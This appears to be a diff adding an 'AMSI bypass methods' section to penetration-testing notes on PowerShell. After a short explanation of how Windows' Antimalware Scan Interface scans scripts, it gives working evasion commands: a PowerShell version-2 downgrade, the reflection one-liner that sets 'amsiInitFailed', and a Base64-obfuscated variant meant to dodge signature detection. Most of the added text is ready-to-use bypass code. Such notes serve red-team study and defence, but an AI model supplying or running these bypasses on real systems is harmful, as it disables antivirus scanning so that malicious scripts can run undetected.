@@ -65,3 +65,22 @@ Check version of powershell
 | WSManStackVersion              | 3.0                        |
 | PSRemotingProtocolVersion      |2.3                         |
 | SerializationVersion           | 1.1.0.1                    |  
+
+# AMSI bypass methods
+## How AMSI work.
+When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
+- AmsiScanBuffer()
+- AmsiScanString()
+
+![AMSI work](https://pentestlaboratories.files.wordpress.com/2021/05/amsi-powershell-flowchart-1.png?w=1024)
+
+1. PowerShell Downgrade
+        
+        powershell -version 2
+2. Base64 Encode 
+- original AMSI bypass
+
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+- Base64 Encode
+        
+                            [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
